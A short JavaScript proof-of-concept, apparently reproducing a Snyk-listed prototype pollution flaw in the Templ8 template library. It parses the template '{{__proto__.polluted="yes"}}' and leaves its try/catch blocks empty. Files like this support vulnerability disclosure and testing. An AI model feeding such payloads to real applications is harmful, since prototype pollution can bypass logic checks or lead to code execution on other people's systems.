//https://snyk.io/vuln/SNYK-JS-TEMPL8-598770
 
   

  const Templ8 = require("Templ8");
  const tpl = new Templ8('{{__proto__.polluted="yes"}}');
  tpl.parse();

  try {
     
  } catch {
     
  }
// End of file
